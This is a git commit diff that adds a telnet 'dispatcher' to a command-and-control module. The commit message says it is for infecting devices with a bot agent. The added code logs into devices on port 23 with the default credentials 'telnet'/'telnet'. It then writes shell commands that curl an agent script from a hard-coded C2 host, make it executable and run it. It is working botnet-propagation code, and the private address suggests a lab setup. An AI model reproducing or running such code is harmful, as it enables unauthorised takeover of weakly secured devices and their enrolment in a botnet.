de29682e173c420a2890e017160a29fff8261f6c
Ismael Moniz <hismamoniz@gmail.com>
2026-05-30 17:57:21 +0100

    coded dispatcher to infect devices with bot agent via telnet

--- cnc/dispatcher.py
+++ cnc/dispatcher.py
@@ -1,10 +1,15 @@
 import subprocess;
 import json;
+import asyncio;
 import io;
 import inspect;
+import sys;
 import os;
+import telnetlib3;
 
 path = os.path.dirname(inspect.stack()[0][1])
+CC_HOST = "172.18.0.1"
+CC_PORT = "8000"
 
 def add_device(name, ip, alive):
     with open(path + "/../db/devices.json", "r+") as file:
@@ -23,5 +28,42 @@ def add_device(name, ip, alive):
 def main():
     add_device("test", "0.0.0.0", False)
 
+
+# this and the below function install programs have the purpose of
+# logging in to the devices and downloading the agent payload to them
+async def shell(reader, writer, username, password, dev_id):
+    logged_in = False
+
+    while True:
+        output = await reader.read(1024)
+        if not output:
+            break;
+
+        print(output, end='', flush=True)
+        if not logged_in:
+            if 'login' in output:
+                writer.write(username + '\r\n')
+            elif 'password' in output or 'Password' in output:
+                writer.write(password + '\r\n')
+
+            elif '$' in output:
+                logged_in = True
+                # TODO: integrated device id management
+                writer.write(f"curl http://{CC_HOST}:{CC_PORT}/payload/agent?device_id={dev_id} -o agent.sh\r\n")
+        else:
+            if "$" in output:
+                writer.write(f"echo {dev_id} > dev_id\r\n")
+                writer.write(f"chmod +x agent.sh\r\n")
+                writer.write(f"./agent.sh\r\n")
+                writer.write("exit\r\n")
+            
+
+async def install_programs(ip):
+    reader, writer = await telnetlib3.client.open_connection(ip, 23);
+    await shell(reader, writer, 'telnet', 'telnet', 1);
+
 if __name__ == "__main__":
-    main()
+    if len(sys.argv) > 1:
+        asyncio.run(install_programs(sys.argv[1]))
+    else:
+        main()
